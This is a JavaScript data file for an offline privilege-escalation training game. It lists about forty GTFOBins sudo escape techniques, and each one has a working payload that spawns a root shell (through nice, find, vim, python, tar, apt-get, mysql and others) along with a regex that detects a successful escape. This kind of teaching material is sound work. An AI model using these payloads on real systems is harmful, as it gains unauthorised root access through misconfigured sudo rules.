// gtfobins.js — a curated slice of GTFOBins, as data.
//
// The ROADMAP asked for "ingesting the real GTFOBins JSON to auto-generate
// levels". A zero-server, offline-first game can't fetch gtfobins.github.io at
// runtime, so ingestion here means the honest version of the same idea: the
// sudo-shell techniques are lifted from GTFOBins into a local dataset the game
// reads, with the *real* payloads and a detector for each. Two things then
// stop being hand-maintained:
//
//   • the sudo escape engine (commands.js#sudoEscapes) falls through to this
//     table for any binary it doesn't special-case, so recognising a new
//     GTFOBin is a data edit, not a code edit;
//   • the procedural generator (rogue.js) and the box builder draw their sudo
//     binary from here, so every technique in the table can turn up as a box.
//
// Each entry is a real GTFOBins `sudo` function:
//   bin      the binary name as it appears under sudo
//   cat      the shape of the trick (exec-wrapper, interactive escape, …)
//   payload  a working invocation, the one shown as the box's final hint
//   detect   what counts as "they pulled it off", tested against the joined
//            argument string sudo sees (quotes/backslashes already stripped by
//            the tokenizer, so `\;` arrives as `;` and `"x"` as `x`)
//
// `payload` and `detect` are kept consistent on purpose: the hint the game
// gives a player always satisfies the check the game makes.
window.GTFOBINS = {
    SHELL: /\/bin\/(sh|bash|dash)\b|(^|\s)(sh|bash|dash)(\s|$)/,

    // Ordered roughly easy → obscure. The bespoke cases in commands.js
    // (find/awk/env/less/git/tar/make/…) are also listed so the payload and
    // reference link exist in one place, but their detection there stays the
    // authority — this table only *adds* reach, it never overrides.
    ENTRIES: [
        // ── exec-wrapper: the binary runs whatever command follows it ──────
        { bin: 'nice',      cat: 'wrapper',     payload: 'sudo nice /bin/sh',                              detect: /\/bin\/(sh|bash|dash)/ },
        { bin: 'ionice',    cat: 'wrapper',     payload: 'sudo ionice /bin/sh',                           detect: /\/bin\/(sh|bash|dash)/ },
        { bin: 'taskset',   cat: 'wrapper',     payload: 'sudo taskset 1 /bin/sh',                        detect: /\/bin\/(sh|bash|dash)/ },
        { bin: 'stdbuf',    cat: 'wrapper',     payload: 'sudo stdbuf -i0 /bin/sh',                       detect: /\/bin\/(sh|bash|dash)/ },
        { bin: 'timeout',   cat: 'wrapper',     payload: 'sudo timeout 7d /bin/sh',                       detect: /\/bin\/(sh|bash|dash)/ },
        { bin: 'flock',     cat: 'wrapper',     payload: 'sudo flock -u / /bin/sh',                       detect: /\/bin\/(sh|bash|dash)/ },
        { bin: 'nsenter',   cat: 'wrapper',     payload: 'sudo nsenter /bin/sh',                          detect: /\/bin\/(sh|bash|dash)/ },
        { bin: 'nohup',     cat: 'wrapper',     payload: 'sudo nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"', detect: /\/bin\/(sh|bash|dash)/ },
        { bin: 'cpulimit',  cat: 'wrapper',     payload: 'sudo cpulimit -l 100 -f /bin/sh',               detect: /-f\s+.*\/bin\/(sh|bash|dash)/ },
        { bin: 'start-stop-daemon', cat: 'wrapper', payload: 'sudo start-stop-daemon -n x -S -x /bin/sh', detect: /-x\s+.*\/bin\/(sh|bash|dash)/ },
        { bin: 'busybox',   cat: 'wrapper',     payload: 'sudo busybox sh',                               detect: /(^|\s)sh(\s|$)/ },
        { bin: 'xargs',     cat: 'wrapper',     payload: "sudo xargs -a /dev/null sh",                    detect: /(^|\s)(sh|\/bin\/(sh|bash))(\s|$)/ },

        // ── language interpreters: run a shell from code ──────────────────
        { bin: 'lua',       cat: 'interpreter', payload: 'sudo lua -e \'os.execute("/bin/sh")\'',         detect: /os\.execute|io\.popen/ },
        { bin: 'php',       cat: 'interpreter', payload: 'sudo php -r \'system("/bin/sh");\'',            detect: /system\(|passthru\(|exec\(|popen\(/ },
        { bin: 'python',    cat: 'interpreter', payload: 'sudo python -c \'import os;os.system("/bin/sh")\'', detect: /os\.system|pty\.spawn|subprocess/ },
        { bin: 'gdb',       cat: 'interpreter', payload: "sudo gdb -nx -ex '!sh' -ex quit",               detect: /!\s*(sh|bash)|-ex.*(sh|bash)/ },
        { bin: 'ruby',      cat: 'interpreter', payload: 'sudo ruby -e \'exec "/bin/sh"\'',               detect: /exec\s|system\(/ },

        // ── interactive tools with a shell-out command ────────────────────
        { bin: 'ftp',       cat: 'interactive', payload: 'sudo ftp\n!/bin/sh',                            detect: /!\s*\/bin\/(sh|bash)|!\s*(sh|bash)/ },
        { bin: 'ed',        cat: 'interactive', payload: 'sudo ed\n!/bin/sh',                             detect: /!\s*\/bin\/(sh|bash)|!\s*(sh|bash)/ },
        { bin: 'nmap',      cat: 'interactive', payload: 'sudo nmap --interactive\nnmap> !sh',            detect: /--interactive|!\s*sh/ },
        { bin: 'tmux',      cat: 'interactive', payload: 'sudo tmux',                                     detect: /^tmux(\s|$)|new-session/ },
        { bin: 'scp',       cat: 'wrapper',     payload: 'sudo scp -S /bin/sh x y',                       detect: /-S\s+\/bin\/(sh|bash)/ },
        { bin: 'socat',     cat: 'wrapper',     payload: 'sudo socat stdin exec:/bin/sh',                 detect: /exec:\s*\/bin\/(sh|bash)/ },
        { bin: 'expect',    cat: 'interpreter', payload: "sudo expect -c 'spawn /bin/sh;interact'",       detect: /spawn\s+\/bin\/(sh|bash)/ },

        // ── the ones commands.js already special-cases: kept for payload +
        //    link parity, detection stays with the bespoke logic there ──────
        { bin: 'find',      cat: 'wrapper',     payload: 'sudo find . -exec /bin/sh \\; -quit',           detect: /-exec\s+\/bin\/(sh|bash)/ },
        { bin: 'env',       cat: 'wrapper',     payload: 'sudo env /bin/sh',                              detect: /\/bin\/(sh|bash)/ },
        { bin: 'vim',       cat: 'interactive', payload: "sudo vim -c ':!/bin/sh'",                       detect: /:!\/bin\/(sh|bash)|:!sh/ },
        { bin: 'less',      cat: 'interactive', payload: 'sudo less !/bin/sh',                            detect: /!\/bin\/sh|!sh/ },
        { bin: 'awk',       cat: 'interpreter', payload: 'sudo awk \'BEGIN {system("/bin/sh")}\'',        detect: /system\(/ },
        { bin: 'perl',      cat: 'interpreter', payload: 'sudo perl -e \'exec "/bin/sh";\'',              detect: /exec\s|system\(/ },
        { bin: 'python3',   cat: 'interpreter', payload: 'sudo python3 -c \'import os;os.system("/bin/sh")\'', detect: /os\.system|pty\.spawn/ },
        { bin: 'node',      cat: 'interpreter', payload: 'sudo node -e \'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})\'', detect: /child_process/ },
        { bin: 'tar',       cat: 'wrapper',     payload: 'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh', detect: /checkpoint-action\s*=\s*exec/ },
        { bin: 'make',      cat: 'wrapper',     payload: 'sudo make -s --eval=\'x:\\n\\t-/bin/sh 1>&0\'', detect: /--eval/ },
        { bin: 'git',       cat: 'interactive', payload: 'sudo git -p help !/bin/sh',                     detect: /-p\b.*!\/bin\/(sh|bash)|-p\b.*!sh/ },
        { bin: 'rsync',     cat: 'wrapper',     payload: "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null", detect: /-e\s+.*(sh|bash)/ },
        { bin: 'zip',       cat: 'wrapper',     payload: 'sudo zip x.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"', detect: /--unzip-command/ },
        { bin: 'systemd-run', cat: 'wrapper',   payload: "sudo systemd-run -t /bin/sh",                   detect: /(^|\s)systemd-run(\s|$)/ },
        { bin: 'apt-get',   cat: 'wrapper',     payload: 'sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh', detect: /pre-invoke/i },
        { bin: 'mysql',     cat: 'interactive', payload: 'sudo mysql -e \'\\! /bin/sh\'',                 detect: /!\s*\/bin\/(sh|bash)/ }
    ],

    _byBin: null,
    byBin(bin) {
        if (!this._byBin) {
            this._byBin = {};
            for (const e of this.ENTRIES) if (!this._byBin[e.bin]) this._byBin[e.bin] = e;
        }
        return this._byBin[bin] || null;
    },

    payload(bin) { const e = this.byBin(bin); return e ? e.payload : null; },
    link(bin) { return 'https://gtfobins.github.io/gtfobins/' + bin + '/'; },

    // Does this invocation, of this binary, land a root shell? Consulted by
    // commands.js#sudoEscapes as its fall-through for un-special-cased bins.
    escapes(bin, joined) {
        const e = this.byBin(bin);
        return !!(e && e.detect && e.detect.test(String(joined || '')));
    },

    // Binary names the generators may build a box around. All of them are
    // recognised either by the bespoke logic in commands.js or by escapes()
    // above, so every one produces a solvable box.
    bins() { return this.ENTRIES.map(e => e.bin); }
};
